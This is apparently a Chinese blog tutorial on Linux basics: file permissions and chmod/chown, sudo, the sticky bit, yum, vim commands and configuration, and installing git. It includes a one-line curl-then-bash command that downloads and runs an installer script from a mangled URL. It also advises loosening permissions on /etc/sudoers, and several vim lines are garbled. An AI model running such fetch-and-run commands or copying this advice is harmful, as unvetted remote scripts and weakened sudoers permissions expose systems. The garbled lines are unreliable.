title="文件权限值得表示方法"></a>文件权限值得表示方法</h4><p>字符表示方法</p><table><thead><tr><th>Linux表示</th><th>说明</th><th>Linux表示</th><th>说明</th></tr></thead><tbody><tr><td>r–</td><td>只读</td><td>-w-</td><td>仅可写</td></tr><tr><td>–x</td><td>仅可执行</td><td>rw-</td><td>读可写</td></tr><tr><td>-wx</td><td>可写和执行</td><td>r-x</td><td>可读可执行</td></tr><tr><td>rwx</td><td>可读可写可执行</td><td>—</td><td>无权限</td></tr></tbody></table><table><thead><tr><th>权限符号</th><th>八进制</th><th>二进制</th></tr></thead><tbody><tr><td>r</td><td>4</td><td>100</td></tr><tr><td>w</td><td>2</td><td>010</td></tr><tr><td>x</td><td>1</td><td>001</td></tr><tr><td>rw</td><td>6</td><td>110</td></tr><tr><td>rx</td><td>5</td><td>101</td></tr><tr><td>wx</td><td>3</td><td>011</td></tr><tr><td>rwx</td><td>7</td><td>111</td></tr><tr><td>—</td><td>0</td><td>000</td></tr></tbody></table><h4 id="文件权限访问得相关设置方法"><a href="#文件权限访问得相关设置方法" class="headerlink" title="文件权限访问得相关设置方法"></a>文件权限访问得相关设置方法</h4><h5 id="chmod功能：设置访问权限"><a href="#chmod功能：设置访问权限" class="headerlink" title="chmod功能：设置访问权限"></a>chmod功能：设置访问权限</h5><p>格式：chmod [参数] 权限 文件明</p><p>常用选项：</p><ul><li>R-&gt;递归修改目录文件的权限</li><li>说明:只有文件的拥有者和root才可以改变文件的权限</li></ul><p><em>chmod命令权限值的格式</em></p><p>① 用户表示符 +&#x2F;-&#x3D;权限字符</p><ul><li>+:向权限范围增加权限代号所表示的权限</li><li>-:向权限范围取消权限代号所表示的权限</li><li>&#x3D;:向权限范围赋予权限代号所表示的权限</li><li>用户符号:</li><li>u:拥有者</li><li>g:拥有者同组者</li><li>o:其它用户</li><li>a:所有用户</li></ul><p><strong>实例</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[youzipii@localhost ~]$ ll</span><br><span class="line">total 4</span><br><span class="line">-rw-rw-r--. 1 youzipii youzipii 14 Nov  1 04:04 youzipii.txt</span><br><span class="line">[youzipii@localhost ~]$ chmod u-rw,g-rw,o-r youzipii.txt</span><br><span class="line">[youzipii@localhost ~]$ ll</span><br><span class="line">total 4</span><br><span class="line">----------. 1 youzipii youzipii 14 Nov  1 04:04 youzipii.txt</span><br><span class="line">[youzipii@localhost ~]$ chmod u+w,a=x youzipii.txt</span><br><span class="line">[youzipii@localhost ~]$ ll</span><br><span class="line">total 4</span><br><span class="line">---x--x--x. 1 youzipii youzipii 14 Nov  1 04:04 youzipii.txt</span><br></pre></td></tr></table></figure><p>②三位8进制数字</p><p><strong>实例</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[youzipii@localhost ~]$ chmod 000 youzipii.txt</span><br><span class="line">[youzipii@localhost ~]$ ll</span><br><span class="line">total 4</span><br><span class="line">----------. 1 youzipii youzipii 14 Nov  1 04:04 youzipii.txt</span><br><span class="line">[youzipii@localhost ~]$ chmod 664 youzipii.txt</span><br><span class="line">[youzipii@localhost ~]$ ll</span><br><span class="line">total 4</span><br><span class="line">-rw-rw-r--. 1 youzipii youzipii 14 Nov  1 04:04 youzipii.txt</span><br></pre></td></tr></table></figure><h5 id="chown功能：修改文件拥有者"><a href="#chown功能：修改文件拥有者" class="headerlink" title="chown功能：修改文件拥有者"></a>chown功能：修改文件拥有者</h5><p>格式：chown [参数] 用户名，文件名</p><p><strong>实例</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># chown user1 f1</span><br><span class="line"># chwon -R user1 filegroup1</span><br></pre></td></tr></table></figure><h5 id="chgrp功能：修文件或目录所属组"><a href="#chgrp功能：修文件或目录所属组" class="headerlink" title="chgrp功能：修文件或目录所属组"></a>chgrp功能：修文件或目录所属组</h5><p>格式：chgrp [参数] 用户组名 文件名</p><p>常用选项： -R 递归修改文件或目录所属组</p><p><strong>实例</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># chgrp users /abc/f2</span><br></pre></td></tr></table></figure><h5 id="使用sudo分配权限"><a href="#使用sudo分配权限" class="headerlink" title="使用sudo分配权限"></a>使用sudo分配权限</h5><p>（1） 修改&#x2F;etc&#x2F;sudoers文件分配文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod 740 /etc/sudoers</span><br><span class="line">vi /etc/sudoer</span><br></pre></td></tr></table></figure><p>（2） 使用sudo调用授权命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[youzipii@localhost ~]$ whoami</span><br><span class="line">youzipii</span><br><span class="line">[youzipii@localhost ~]$ sudo -u root whoami</span><br><span class="line">root</span><br><span class="line">...</span><br><span class="line">or</span><br><span class="line">...</span><br><span class="line">[youzipii@localhost ~]$ whoami</span><br><span class="line">youzipii</span><br><span class="line">[sudo] password for youzipii:</span><br><span class="line">[youzipii@localhost ~]$ sudo whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure><h3 id="目录权限"><a href="#目录权限" class="headerlink" title="目录权限"></a>目录权限</h3><ul><li>可执行权限:如果目录没有可执行权限,则无法cd到目录中.</li><li>可读权限:如果目录没有可读权限,则无法用ls等命令查看目录中的文件内容.</li><li>可写权限:如果目录没有可写权限,则无法在目录中创建文件,也无法在目录中删除文件.</li></ul><p>换句话来讲,就是只要用户具有目录的写权限,用户就可以删除目录中的文件,而不论这个用户是否有这个文件的写权限.<br>这好像不太科学啊,我张三创建的一个文件,凭什么被你李四可以删掉?我们用下面的过程印证一下.</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[youzipii@localhost ~]$ sudo chmod 777 fortest</span><br><span class="line">[youzipii@localhost ~]$ ll</span><br><span class="line">total 4</span><br><span class="line">drwxrwxrwx. 2 root  root      6 Nov  1 04:38 fortest</span><br><span class="line">-rw-rw-r--. 1 user1 youzipii 14 Nov  1 04:04 youzipii.txt</span><br><span class="line">[youzipii@localhost ~]$ ls -ld fortest/</span><br><span class="line">drwxrwxrwx. 2 root root 6 Nov  1 04:38 fortest/</span><br><span class="line">[youzipii@localhost ~]$ cd fortest/</span><br><span class="line">[youzipii@localhost fortest]$ touch test.c</span><br><span class="line">[youzipii@localhost fortest]$ ll</span><br><span class="line">total 0</span><br><span class="line">-rw-rw-r--. 1 youzipii youzipii 0 Nov  1 04:41 test.c</span><br><span class="line">[youzipii@localhost fortest]$ sudo touch test_root.c</span><br><span class="line">[youzipii@localhost fortest]$ ll</span><br><span class="line">total 0</span><br><span class="line">-rw-rw-r--. 1 youzipii youzipii 0 Nov  1 04:41 test.c #普通用户</span><br><span class="line">-rw-r--r--. 1 root     root     0 Nov  1 04:41 test_root.c #超级用户</span><br><span class="line">[youzipii@localhost fortest]$ whoami</span><br><span class="line">youzipii</span><br><span class="line">[youzipii@localhost fortest]$ rm test_root.c</span><br><span class="line">rm: remove write-protected regular empty file ‘test_root.c’? y</span><br><span class="line">[youzipii@localhost fortest]$ ll</span><br><span class="line">total 0</span><br><span class="line">-rw-rw-r--. 1 youzipii youzipii 0 Nov  1 04:41 test.c #删除成功</span><br></pre></td></tr></table></figure><p>为了解决这个问题，Linux引入了粘滞位</p><h4 id="粘滞位-好文-https-blog-csdn-net-better1914-article-details-53943081"><a href="#粘滞位-好文-https-blog-csdn-net-better1914-article-details-53943081" class="headerlink" title="粘滞位[好文][https://blog.csdn.net/better1914/article/details/53943081]"></a>粘滞位[好文][<a href="https://blog.csdn.net/better1914/article/details/53943081]">https://blog.csdn.net/better1914/article/details/53943081]</a></h4><p>粘滞位（Stickybit），或粘着位。最常见的用法在目录上设置粘滞位，如此以来，只有目录内文件的所有者或者root才可以删除或移动该文件。如果不为目录设置粘滞位，任何具有该目录写和执行权限的用户都可以删除和移动其中的文件。在我们系统中，粘滞位一般用于&#x2F;tmp目录，以防止普通用户删除或移动其他用户的文件。<br>一个目录具有粘滞位，则在other的X位会表现为 t,或者T.大小写的区别在于，原来x位上有x权限，有了粘滞位则表现为t.否则，表现为T。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[youzipii@localhost /]$ ls -ld /tmp</span><br><span class="line">drwxrwxrwt. 30 root root 4096 Nov  1 04:04 /tmp</span><br></pre></td></tr></table></figure><p><em>删除用户是最好带上-r不然用户的home目录不会一起删除</em></p><h3 id="关于目录权限总结"><a href="#关于目录权限总结" class="headerlink" title="关于目录权限总结"></a>关于目录权限总结</h3><ul><li>目录的可执行权限是表示你可否在目录下执行命令。</li><li>如果目录没有-x权限，则无法对目录执行任何命令，甚至无法cd进入目,即使目录仍然有-r读权限（这个地方很容易犯错，认为有读权限就可以进入目录读取目录下的文件)</li><li>而如果目录具有-x权限，但没有-权限，则用户可以执行命令，可以cd进入目录。但由于没有目录的读权限</li><li>所以在目录下，即使可以执行ls命令，但仍然没有权限读出目录下的文档。</li></ul><h2 id="Linux软件包管理yum"><a href="#Linux软件包管理yum" class="headerlink" title="Linux软件包管理yum"></a>Linux软件包管理yum</h2><h3 id="什么时软件包"><a href="#什么时软件包" class="headerlink" title="什么时软件包"></a>什么时软件包</h3><ul><li>在Linux下安装软件,一个通常的办法是下载到程序的源代码,并进行编译,得到可执行程序.</li><li>但是这样太麻烦了，于是有些人把一些常用的软件提前编译好,做成软件包(可以理解成windows上的安装程序)放在一个服务器上,通过包管理器可以很方便的获取到这个编译好的软件包,直接进行安装.</li><li>软件包和软件包管理器,就好比”App”和”应用商店”这样的关系.</li><li>yum(Yellow dog Updater, Modified)是Linux下非常常用的一种包管理器.主要应用在Fedora, RedHat,Centos等发行版上.</li></ul><h3 id="关于rzsz"><a href="#关于rzsz" class="headerlink" title="关于rzsz"></a>关于rzsz</h3><p>这个工具用于windows机器和远端的Linux机器通过XShell传输文件.安装完毕之后可以通过拖拽的方式将文件上传过去.</p><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>关于yum的所有操作必须保证主机(虚拟机)网络畅通!可以通过 ping 指令验证</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping baidu.com</span><br></pre></td></tr></table></figure><p>ping命令是一个用来进行检测网络连通性的命令，我们目前主要会用就行，如果你不知道自己的主机有没有联网，可以试试ping</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[youzipii@localhost yum.repos.d]$ ping baidu.com -c 4</span><br><span class="line">PING baidu.com (110.242.68.66) 56(84) bytes of data.</span><br><span class="line">64 bytes from 110.242.68.66 (110.242.68.66): icmp_seq=1 ttl=128 time=56.8 ms</span><br><span class="line">64 bytes from 110.242.68.66 (110.242.68.66): icmp_seq=2 ttl=128 time=56.2 ms</span><br><span class="line">64 bytes from 110.242.68.66 (110.242.68.66): icmp_seq=3 ttl=128 time=57.3 ms</span><br><span class="line">64 bytes from 110.242.68.66 (110.242.68.66): icmp_seq=4 ttl=128 time=56.1 ms</span><br><span class="line"></span><br><span class="line">--- baidu.com ping statistics ---</span><br><span class="line">4 packets transmitted, 4 received, 0% packet loss, time 3004ms</span><br><span class="line">rtt min/avg/max/mdev = 56.184/56.664/57.344/0.561 ms</span><br></pre></td></tr></table></figure><h3 id="查看软件包"><a href="#查看软件包" class="headerlink" title="查看软件包"></a>查看软件包</h3><p>通过yum list 命令可以罗列出当前一共有哪些软件包.由于包的数目可能非常之多，这里我们需要使用grep命令只筛选出我们关注的包.例如:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[youzipii@localhost yum.repos.d]$ yum list | grep lrzsz</span><br><span class="line">lrzsz.x86_64                                0.12.20-36.el7             @anaconda</span><br></pre></td></tr></table></figure><h4 id="注意事项-1"><a href="#注意事项-1" class="headerlink" title="注意事项"></a>注意事项</h4><ul><li>软件包名称:主版本号.次版本号.源程序发行号-软件包的发行号.主机平台.cpu架构.</li><li>“x86_64”后缀表示64位系统的安装包, “i686”后缀表示32位系统安装包.选择包时要和系统匹配.”el7”表示操作系统发行版的版本.</li><li>“el7”表示的是centos7&#x2F;redhat7. “el6”表示centos6&#x2F;redhat6.</li><li>最后一列, base 表示的是”软件源”的名称,类似于”小米应用商店”,”华为应用商店”这样的概念.</li></ul><h3 id="如何安装软件"><a href="#如何安装软件" class="headerlink" title="如何安装软件"></a>如何安装软件</h3><p>通过yum,我们可以通过很简单的一条命令完成gcc的安装.</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo yum install lrzsz</span><br></pre></td></tr></table></figure><p>yum 会自动找到都有哪些软件包需要下载,这时候敲”y”确认安装.出现”complete”字样,说明安装完成.</p><h4 id="注意事项-2"><a href="#注意事项-2" class="headerlink" title="注意事项"></a>注意事项</h4><ul><li>安装软件时由于需要向系统目录中写入内容，一般需要会do或者切到rool账户下才能完成.</li><li>yum安装软件只能一个装完了再装另一个.正在yum安装一个软件的过程中,如果再尝试用yum安装另外-个软件, yum会报错.</li></ul><h3 id="如何卸载软件"><a href="#如何卸载软件" class="headerlink" title="如何卸载软件"></a>如何卸载软件</h3><p>仍然是一条命令:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo yum remove lrzsz</span><br></pre></td></tr></table></figure><h3 id="换源-https-blog-csdn-net-xiaojin21cen-article-details-84726193"><a href="#换源-https-blog-csdn-net-xiaojin21cen-article-details-84726193" class="headerlink" title="[换源][https://blog.csdn.net/xiaojin21cen/article/details/84726193]"></a>[换源][<a href="https://blog.csdn.net/xiaojin21cen/article/details/84726193]">https://blog.csdn.net/xiaojin21cen/article/details/84726193]</a></h3><h2 id="vim与gcc使用"><a href="#vim与gcc使用" class="headerlink" title="vim与gcc使用"></a>vim与gcc使用</h2><p><img src="https://www.runoob.com/wp-content/uploads/2015/10/vi-vim-cheat-sheet-sch.gif" alt="img"></p><h3 id="vi-x2F-vim区别"><a href="#vi-x2F-vim区别" class="headerlink" title="vi&#x2F;vim区别"></a>vi&#x2F;vim区别</h3><p>vilvim的区别简单点来说，它们都是多模式编辑器，不同的是vim是vi的升级版本，它不仅兼容vi的所有指令，而且还有一些新的特性在里面。例如语法加亮，可视化操作不仅可以在终端运行，也可以运行于x window、mac os、windows。我们课堂上，统一按照vim来进行讲解。</p><h3 id="vi使用"><a href="#vi使用" class="headerlink" title="vi使用"></a>vi使用</h3><h4 id="打开和新建文件"><a href="#打开和新建文件" class="headerlink" title="打开和新建文件"></a>打开和新建文件</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi filename</span><br></pre></td></tr></table></figure><p>如果文件已经存在，会直接打开文件</p><p>不存在，会新建一个文件</p><h5 id="打开文件并且定位行"><a href="#打开文件并且定位行" class="headerlink" title="打开文件并且定位行"></a>打开文件并且定位行</h5><p>例如：开始时知道某一行代码有错，就可以快速定位到出错代码的位置</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi 文件名 +行数</span><br></pre></td></tr></table></figure><blockquote><p>提示：如果只带上+而不指定行号，会直接定位到文件末尾</p></blockquote><h4 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h4><p>如果vi异常退出，在磁盘上可能会保存有交换文件</p><p>下次在使用vi编辑文件时可能会出现如下信息，按下字母d可以删除交换文件<img src="/../image/image-20241011170831562.png" alt="image-20241011170831562"></p><blockquote><p>按下键盘时，注意关闭输入法</p></blockquote><h4 id="行内移动"><a href="#行内移动" class="headerlink" title="行内移动"></a>行内移动</h4><ul><li>w 向后移动一个单词</li><li>b 向前移动一个单词</li><li>0 回到行首</li><li>^ 行首，第一个不是空白字符的位置</li><li>$ 行尾</li></ul><h4 id="行数移动"><a href="#行数移动" class="headerlink" title="行数移动"></a>行数移动</h4><ul><li>gg 文件顶部，g代表go</li><li>G 文件末尾</li><li>数字gg 移动到数字对应的行</li><li>数字G 移动到数字对应的行</li><li>:数字 移动到数字对应的行</li></ul><h4 id="屏幕移动"><a href="#屏幕移动" class="headerlink" title="屏幕移动"></a>屏幕移动</h4><ul><li>Ctrl+b 向上翻页</li><li>Ctrl+f 向下翻页</li><li>H 屏幕顶部</li><li>M 屏幕中部</li><li>L 屏幕底部</li></ul><h4 id="移动（程序）"><a href="#移动（程序）" class="headerlink" title="移动（程序）"></a>移动（程序）</h4><p>vi中使用空行来区分段落</p><p>在程序开发时，通常一段功能相关的代码会写在一起，之间就没有空行</p><ul><li>{ 上一段</li><li>} 下一段</li></ul><h5 id="括号切换"><a href="#括号切换" class="headerlink" title="括号切换"></a>括号切换</h5><p>在程序世界中，()[]{}三种括号的使用频率是非常高的</p><ul><li>% 匹配括号，也就是在第一个括号按shift+5可以匹配到对应形成闭合的括号</li></ul><h4 id="标记"><a href="#标记" class="headerlink" title="标记"></a>标记</h4><ul><li>在开发时，棠一块代码可能需要稍后处理，例如:编辑、查看</li><li>此时先使用 m增加一个标记，这样可以 在需要时快速地跳转回来 或者 执行其他编辑操作</li><li>标记名称 可以是 a<del>z 或者 A</del>z 之间的任意 一个 字母</li><li>添加了标记的 行如果被删除，标记同时被删除</li><li>如果 在其他行添加了相同名称的标记，之前添加的标记也会被替换掉</li></ul><table><thead><tr><th>命令</th><th>英文</th><th>功能</th></tr></thead><tbody><tr><td>mx</td><td>mark</td><td>添加标记x，x是a-z后者A-Z之间的任意一个字母</td></tr><tr><td>‘x’</td><td></td><td>直接定位到标记x所在位置（飞雷神）</td></tr></tbody></table><h4 id="选中文本（可视模式）"><a href="#选中文本（可视模式）" class="headerlink" title="选中文本（可视模式）"></a>选中文本（可视模式）</h4><ol><li>学习 复制 命令前，应该先学会 怎么样选中 要复制的代码</li><li>在 vi 中要选择文本，需要先使用 visual命令切换到 可视模式</li><li>vi 中提供了 三种 可视模式，可以方便程序员选择 选中文本的方式</li><li>按 ESC 可以放弃选中，返回到 命令模式</li></ol><table><thead><tr><th>命令</th><th>模式</th><th>功能</th></tr></thead><tbody><tr><td>v</td><td>可视模式</td><td>从光标位置剋是按照正常模式选择文本，就光标划到哪选到哪</td></tr><tr><td>V</td><td>可视行模式</td><td>光标经过的行都会被选中</td></tr><tr><td>Ctrl+v</td><td>可是块模式</td><td>锤石方向选中文本，可以结合移动相关操作使用</td></tr><tr><td>ggVG</td><td></td><td>选中所有内容</td></tr></tbody></table><h3 id="vim基本概念"><a href="#vim基本概念" class="headerlink" title="vim基本概念"></a>vim基本概念</h3><p>课堂上我们讲解vim的三种模式(其实有好多模式，目前掌握这3种即可),分别是命令模式(command mode)、插入模式(Insert mode)和底行模式弋(last line mode)，各模式的功能区分如下:</p><ul><li>正常&#x2F;普通&#x2F;命令模式(Normal mode)</li></ul><p><em>控制屏幕光标的移动，字符、字或行的删除，移动复制某区段及进入Insert mode下，或者到last line mode</em>·</p><ul><li>插入模式(Insert mode)</li></ul><p><em>只有在Insert mode下，才可以做文字输入，按「ESC」键可回到命令行模式。该模式是我们后面用的最频繁的编辑模式。</em></p><ul><li>·末行模式(last line mode)</li></ul><p><em>文件保存或退出，也可以进行文件替换，找字符串，列出行号等操作。在命令模式下，shift+:即可进入该模式。要查看你的所有模式:打开vim，底行模式直接输入</em></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">:help vim-modes</span><br></pre></td></tr></table></figure><p>我这里一共有12种模式:six BASIC modes和six ADDITIONAL modes.</p><h3 id="vim基本操作"><a href="#vim基本操作" class="headerlink" title="vim基本操作"></a>vim基本操作</h3><ul><li><p>进入vim,在系统提示符号输入vim及文件名称后，就进入vim全屏幕编辑画面;</p><ul><li>$ vim test.c</li><li>不过有一点要特别注意，就是你进入vim之后，是处于[正常模式]，你要切换到[插入模式]才能够输入文字。</li></ul></li><li><p>[正常模式]切换至[插入模式]</p><ul><li>输入a 光标后移</li><li>输入i 不变</li><li>输入o 新起一行</li><li>输入s 但会删除当前光标所在的一个元素</li></ul></li><li><p>[插入模式]切换至[正常模式]</p><ul><li>目前处于[插入模式]，就只能一直输入文字，如果发现输错了字,想用光标键往回移动，将该字删除，可以先按一下「ESC」键转到[正常模式]再删除文字。当然，也可以直接删除。</li></ul></li><li><p>[正常模式]切换至[末行模式][shift +;」，其实就是输入「:」 退出vim及保存文件,在[正常模式]下，按一下「:」冒号键进入「Last line mode],例如:</p><ul><li>: w(保存当前文件)</li><li>: wq(输入「wq」,存盘并退出vim)</li><li>:q!(输入q!,不存盘强制退出vim)</li></ul></li></ul><h3 id="vim正常模式命令集（重要）"><a href="#vim正常模式命令集（重要）" class="headerlink" title="vim正常模式命令集（重要）"></a>vim正常模式命令集（重要）</h3><ul><li><p>插入模式</p><ul><li>·按「i」切换进入插入模式「insert mode]按”井入插入模式后是从光标当前位置开始输入文件;[重<br>要]</li><li>·按「a」进入插入模式后，是从目前光标d在位置的下一个位置开始输入文字;</li><li>·按「o」进入插入模式后，是括入新的一行，从行首开始输入文字。</li></ul></li><li><p>从插入模式切换为命令模式</p><ul><li>按「ESC」键。〔[重要]</li></ul></li><li><p>移动光标</p><ul><li>vim可以直接用键盘上的光标来上下左右移动，但正规的vim是用小写英文字母[h]、 [j]、 [k] 、[l]，分别控制光标左、下、上、右移一格</li><li>按[G]:移动到文章的最后〔重要]</li><li>按[$]:移动到光标所在行的”行尾”[重要]</li><li>按[^]:移动到光标所在行的“行首”[重要]</li><li>按[w]:光标跳到下个字的开头〔重要</li><li>按[e]:光标跳到下个字的字尾</li><li>按[b]︰光标回到上个字的开头[重要]</li><li>按[#]︰光标移到该行的第#个位置，如:5l,56l</li><li>按[gg]:进入到文本开始〔[重要]</li><li>按[shift+g]︰进入文本末端</li><li>按[ctrl]+[b]︰屏幕往”后”移动一页</li><li>按[ctrl]+ [f]︰屏幕往”前“移动一页</li><li>按[ctrl]+ [u]︰屏幕往”后”移动半页·</li><li>按[ctrl] + [d]︰屏幕往”前”移动半页</li></ul></li><li><p>删除文字</p><ul><li><p>.[x] : 每按一次，删除光标所在位置的一个字符〔重要]</p></li><li><p>[#x]︰例如，[6x]表示删除光标所在位置的”后面（包含自己在内)”6个字符</p></li><li><p>.[X] 大写的X，每按一次，删除光标所在位置的“前面”一个字符</p></li><li><p>.[#X]︰例如，[20X]表示删除光标所在位置的“前面”20个字符</p></li><li><p>.[dd]:删除光标所在行[重要]</p></li><li><p>[#dd] :从光标所在行开始删除#行[重要]</p></li><li><p>[yw]︰将光标所在之处到字尾的字符复制到缓冲区中。</p></li><li><p>.[#yw]:复制#个字到缓冲区</p></li><li><p>.[yy]:复制光标所在行到缓冲区。[重要]</p></li><li><p>.[#yy」 :例如,[6yy]表示拷贝从光标所在的该行”往下数”6行文字。</p></li><li><p>[p]︰将缓冲区内的字符贴到光标所在位置。注意:所有与”y”有关的复制命令都必须与”p”配合才能完成复制与粘贴功能。[重要]</p></li></ul></li><li><p>替换</p><ul><li>[r]︰替换光标所在处的字符。</li><li>.[R ]:香交元粽所至芝媒富拿es，直到接下 [ESC]</li></ul></li><li><p>销上一次操作</p><ul><li>[u]∶如果您误执行一个命令，可以马上按下0l<br>回到上、个操作。按多次“u”可以执行多次回复。<br>[重要]</li><li>.[ctrl+r]:撤销的恢复「[重要]</li></ul></li><li><p>更改</p><ul><li>.[c]:更改光标所在处到字尾处</li><li>.[c#w]︰例如，[c3w]表示更攻个字</li></ul></li><li><p>跳至指定的行</p><ul><li>[ctrl] + [g]: 列出光标所夺行的接往号。[重要]</li><li>[#G]︰例如，[15G]，表示移动光标至文章的第15行行首。</li></ul></li></ul><h3 id="vim末行模式命令集"><a href="#vim末行模式命令集" class="headerlink" title="vim末行模式命令集"></a>vim末行模式命令集</h3><p>在使用末行模式之前，请记住先按「ESC」键确定您已经处于正常模式，再按「:」冒号即可进入末行模式。</p><ul><li>列出行号<ul><li>[set nu] :输入[set nu]后，会在文件中的每一行前面列出行号。[重要]跳到文件中的某一行</li><li>[#] :[#]号表示一个数字，在冒号后输入一个数字，再按回车键就会跳到该行了，如输入数字15，再<br>回车，就会跳到文章的第15行。</li></ul></li><li>查找字符<ul><li>[&#x2F;关键字]∶先按[&#x2F;]键，再输入您想寻找的字符，如果第一次找的关键字不是您想要的，可以一直按[n]会往后寻找到您要的关键字为止。</li><li>[?关键字]︰先按[?]键，再输入您想寻找的字符，如果第一次找的关键字不是您想要的，可以一直按[n]会往前寻找到您要的关键字为止。</li><li>问题:&#x2F;和?查找有和区别?操作实验一下</li></ul></li><li>保存文件[重要]<ul><li>.[w]:在冒号输入字母[w]就可以将文件保存起来</li></ul></li><li>离开vim[重要]<ul><li>[q]︰按[q]就是退出，如果无法离开vim，可以在「q」后跟一个[!]强制离开vim。</li><li>.[wq] :一般建议离开时，搭配[w]一起使用，这样在退出的时候还可以保存文件。</li></ul></li><li>两个桌面光标切换<ul><li>按住CTRL +两下w</li></ul></li><li>！+gcc&#x2F;man等命令<ul><li>例如！gcc test.c</li></ul></li></ul><h3 id="vim操作总结"><a href="#vim操作总结" class="headerlink" title="vim操作总结"></a>vim操作总结</h3><ul><li><p>三种模式</p><ul><li>正常模式</li><li>插入模式</li><li>底行模式</li></ul></li><li><p>vim操作</p><ul><li>打开，关闭，查看，查询，插入，删除，替换，撤销，复制等等操作。</li></ul></li></ul><h3 id="简单vim配置"><a href="#简单vim配置" class="headerlink" title="简单vim配置"></a>简单vim配置</h3><h4 id="自动配置-https-github-com-askunix-VimForCpp"><a href="#自动配置-https-github-com-askunix-VimForCpp" class="headerlink" title="[自动配置][https://github.com/askunix/VimForCpp]"></a>[自动配置][<a href="https://github.com/askunix/VimForCpp]">https://github.com/askunix/VimForCpp]</a></h4><p>保证自己联网的情况下，命令行直接运行，一键部署</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl - sLfhttps://gitee,conHGtz2222/vimForcpp/raw/master/insta1l.sh -o ./insta11.sh &amp;&amp; bash./install.sh</span><br></pre></td></tr></table></figure><h4 id="配置文件位置"><a href="#配置文件位置" class="headerlink" title="配置文件位置"></a>配置文件位置</h4><ul><li>在目录&#x2F;etcl下面，有个名为vimrc的文件，这是系统中公共的vim配置文件，对所有用户都有效。</li><li>而在每个用户的主目录下，都可以自己建立私有的配置文件，命名为: “.vimrc”。例如，&#x2F;root目录下，通常已经存在一个.vimrc文件,如果不存在，则创建之。</li><li>切换用户成为自己执行su，进入自己的主工作目录,执行cd ~</li><li>打开自己目录下的.vimrc文件，执行vim .vimrc</li></ul><h4 id="常用配置选项，用来测试"><a href="#常用配置选项，用来测试" class="headerlink" title="常用配置选项，用来测试"></a>常用配置选项，用来测试</h4><ul><li>设置语法高亮: syntax on</li><li>显示行号: set nu</li><li>设置缩进的空格数为4: set shiftwidth&#x3D;4</li></ul><h4 id="使用插件"><a href="#使用插件" class="headerlink" title="使用插件"></a>使用插件</h4><p>要配置好看的vim，原生的配置可能功能不全，可以选择安装插件来完善配置，保证用户是你要配置的用户，接下来:</p><ul><li>安装TagList插件,下载taglist_xx.zip ,解压完成，将解压出来的doc的内容放到<del>&#x2F;.vim&#x2F;doc,将解压出来的plugin下的内容拷贝到</del>l.vim&#x2F;plugin</li><li>在~&#x2F;.vimrc中添加: let Tlist_show_one_File&#x3D;1(let Tlist_Exit_on1ywindow&#x3D;1) letTlist_use_Right_window&#x3D;1</li><li>安装文件浏览器和窗口管理器插件: WinManager</li><li>下载winmanager.zip，2.x版本以上的</li><li>解压winmanager.zip，将解压出来的doc的内容放到<del>&#x2F;.vim&#x2F;doc,将解压出来的plugin下的内容拷贝到</del>&#x2F; .vim&#x2F;plugin</li><li>在~&#x2F;.vimrc中添加let g:winManagerwindowLayout&#x3D;‘FileExplorer|TagListnmap wm: wMToggle<cr></li><li>然后重启vim,打开<del>&#x2F;XXX.c或</del>&#x2F;XXX.cpp,在normal状态下输入”wm”,你将看到上图的效果。更具体移步:[点我][<a href="https://blog.csdn.net/wooin/article/details/1858917],%E5%85%B6%E4%BB%96%E6%89%8B%E5%86%8C%EF%BC%8C%E8%AF%B7%E6%89%A7%E8%A1%8Cvimtutor%E5%91%BD%E4%BB%A4%E3%80%82">https://blog.csdn.net/wooin/article/details/1858917],其他手册，请执行vimtutor命令。</a></li></ul><h3 id="vim参考资料-https-github-com-wsdjeg-vim-galore-zh-cn"><a href="#vim参考资料-https-github-com-wsdjeg-vim-galore-zh-cn" class="headerlink" title="[vim参考资料][https://github.com/wsdjeg/vim-galore-zh_cn]"></a>[vim参考资料][<a href="https://github.com/wsdjeg/vim-galore-zh_cn]">https://github.com/wsdjeg/vim-galore-zh_cn]</a></h3><h2 id="ubuntu中安装git"><a href="#ubuntu中安装git" class="headerlink" title="ubuntu中安装git"></a>ubuntu中安装git</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install git</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(base) youzipii@youzipii-virtual-machine:~$ git</span><br><span class="line">usage: git [--version] [--help] [-C &lt;path&gt;] [-c name=value]</span><br><span class="line">           [--exec-path[=&lt;path&gt;]] [--html-path] [--man-path] [--info-path]</span><br><span class="line">           [-p | --paginate | --no-pager] [--no-replace-objects] [--bare]</span><br><span class="line">           [--git-dir=&lt;path&gt;] [--work-tree=&lt;path&gt;] [--namespace=&lt;name&gt;]</span><br><span class="line">           &lt;command&gt; [&lt;args&gt;]</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Linux编辑器-gcc-x2F-g-使用"><a href="#Linux编辑器-gcc-x2F-g-使用" class="headerlink" title="Linux编辑器-gcc&#x2F;g++使用"></a>Linux编辑器-gcc&#x2F;g++使用</h2>]]></content>
      
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA low</title>
      <link href="/2023/07/21/DVWA/"/>
